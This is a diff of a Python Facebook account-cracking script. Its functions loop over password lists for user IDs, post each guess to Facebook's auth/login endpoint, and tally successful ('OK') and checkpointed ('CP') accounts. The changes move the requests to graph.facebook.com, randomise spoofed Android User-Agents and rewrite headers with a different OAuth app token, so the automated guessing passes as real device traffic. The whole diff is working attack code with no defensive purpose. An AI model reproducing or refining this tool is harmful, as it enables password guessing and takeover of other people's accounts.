@@ -1401,7 +1401,7 @@ def mbasic(uid,pwx,tl):
             'X-FB-Client-IP': 'True',
             'X-FB-Server-Cluster': 'True',
             'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
-            url = "https://b-api.facebook.com/auth/login"
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -1478,7 +1478,7 @@ def p(uid,pwx,tl):
             'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
             headers = {
             'Host': 'graph.facebook.com',
-            'User-Agent': '[FBAN/FB4A;FBAV/419.0.0.31459;FBBV/549648855;FBRV/549648855;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo J793V;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
+            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
             'Accept-Encoding': 'gzip, deflate',
             'Accept': '*/*',
             'Connection': 'keep-alive',
@@ -1582,7 +1582,7 @@ def x(uid,pwx,tl):
             'X-Fb-Client-Ip': 'True',
             'X-Fb-Server-Cluster': 'True',
             'Content-Length': '847'}
-            url = "https://b-api.facebook.com/auth/login"
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -1713,7 +1713,7 @@ def freeq(uid,pwx,tl):
     global oks
     global cps
     global bkas
-    sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M4) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1742,25 +1742,29 @@ def freeq(uid,pwx,tl):
             'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
             'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',}
             headers = {
-            'User-Agent': 'Davik/2.1.0 (Linux; U; Android 6.0.0; Oppo J793V Build/RKQ1.933887.152) [FBAN/FB4A;FBAV/419.0.0.31459;FBBV/549648855;FBRV/549648855;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo J793V;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
+            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
             'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'close',
-            'Content-Type': 'application/x-www-form-urlencoded',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
             'Host': 'graph.facebook.com',
-            'X-FB-Net-HNI': str(random.randint(20000,40000)),
-            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type': 'WIFI',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Priority': 'u=3, i',
+            'X-Fb-Sim-Hni': str(random.randint(20000, 40000)),
+            'X-Fb-Net-Hni': str(random.randint(20000, 40000)),
+            'X-Fb-Connection-Quality': 'GOOD',
+            'Zero-Rated': '0',
+            'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
+            'X-Fb-Connection-Bandwidth': str(random.randint(20000, 40000)),
+            'X-Fb-Connection-Type': 'MOBILE.LTE',
+            'X-Fb-Device-Group': '5035',
             'X-Tigon-Is-Retry': 'False',
-            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-device-group': str(random.randint(2000, 4000)),
-            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags': 'graphservice',
-            'X-FB-HTTP-Engine': 'Liger',
-            'X-FB-Client-IP': 'True',
-            'X-FB-Server-Cluster': 'True',
-            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
-            url = "https://b-api.facebook.com/auth/login"
+            'X-Fb-Friendly-Name': 'authenticate',
+            'X-Fb-Request-Analytics-Tags': 'unknown',
+            'X-Fb-Http-Engine': 'Liger',
+            'X-Fb-Client-Ip': 'True',
+            'X-Fb-Server-Cluster': 'True',
+            'Content-Length': '27'}
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
